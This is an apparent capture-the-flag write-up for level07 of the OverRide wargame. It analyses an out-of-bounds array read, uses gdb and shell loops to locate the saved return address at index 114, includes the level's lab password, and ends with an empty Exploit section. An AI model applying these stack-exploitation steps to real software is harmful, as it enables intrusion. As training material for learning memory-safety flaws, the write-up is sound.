```shell
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level07
           ____                  ____  _     __
          / __ \_   _____  _____/ __ \(_)___/ /__
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level07@192.168.56.101's password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

The program wipes arguments and environment variables. It creates a static array of 400 bytes fo data of storage. It executes a loop prompting the user to enter the command to execute: `store`, `read` or `quit`.
`store_number()` receives a pointer to `data` array and store a number to the given index. Indexes which are modulo 3 and 183rd index are reserved and cannot be assignable.
`read_number()` receive a pointer to `data` array and read the number stored in the given index.
In case of successful execution of command, `main()` prints corresponding message, as well as for unsuccessful execution.
The last instruction zeroing out memory of `command` and it loop again asking the user a command.

`read_number()` do not check if input index, so it allow to read out of boundaries of `data` array. Over 694rd index, program crash with segfault.
```shell
level07@OverRide:~$ ./payload.py --max 1000 | ./level07
[...]
Input command:  Index:  Number at data[693] is 0
 Completed read command successfully
Input command:  Index:  Number at data[694] is 0
 Completed read command successfully
Input command:  Index: Segmentation fault (core dumped)
```
Saved EIP on `main()` function is `0xf7e45513`. While reading out of boundaries of array saved `EIP` should appear.
```gdb
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xf7fceff4 --> 0x1a2d7c
ECX: 0xffffd600 --> 0x0
EDX: 0xffffd600 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xffffd6bc --> 0xf7e45513 (<__libc_start_main+243>:        mov    DWORD PTR [esp],eax)
EIP: 0x80489f1 (<main+718>:     ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80489ee <main+715>:        pop    esi
   0x80489ef <main+716>:        pop    edi
   0x80489f0 <main+717>:        pop    ebp
=> 0x80489f1 <main+718>:        ret
   0x80489f2:   nop
   0x80489f3:   nop
   0x80489f4:   nop
   0x80489f5:   nop
[------------------------------------stack-------------------------------------]
0000| 0xffffd6bc --> 0xf7e45513 (<__libc_start_main+243>:       mov    DWORD PTR [esp],eax)
0004| 0xffffd6c0 --> 0x1
0008| 0xffffd6c4 --> 0xffffd754 --> 0xffffd88f --> 0x0
0012| 0xffffd6c8 --> 0xffffd75c --> 0xffffd8ab --> 0x0
0016| 0xffffd6cc --> 0xf7fd3000 --> 0xf7e2c000 --> 0x464c457f
0020| 0xffffd6d0 --> 0x0
0024| 0xffffd6d4 --> 0xffffd71c --> 0xf7ffcff4 --> 0x20f1c
0028| 0xffffd6d8 --> 0xffffd75c --> 0xffffd8ab --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x80489f1 in main; saved eip 0xf7e45513
 called by frame at 0xffffd730
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd6c0
 Saved registers:
  eip at 0xffffd6bc
gdb-peda$ x/wx 0xffffd6bc
0xffffd6bc:     0xf7e45513
```
Indeed, on reading 1000 bytes, `EIP` it can be seen.
```shell
level07@OverRide:~$ ./payload.py --max 500 | ./level07 | grep -o "Number at data.*$" | cut -d' ' -f5 | sort -hu | sed 's/^/printf "0x%08x" /e' | grep 0xf7e45513
0xf7e45513
level07@OverRide:~$
```
Or without `payload.py`
```shell
level07@OverRide:~$ python -c "print(0xf7e45513)"
4158936339
level07@OverRide:~$ for i in {0..500}; do (echo read; echo $i; echo quit) | ./level07 | if [ $(grep -oE '[0-9]+$') -eq 4158936339 ]; then echo "EIP is on index $i"; fi; done
EIP is on index 114
```
``
# Exploit
```shell
```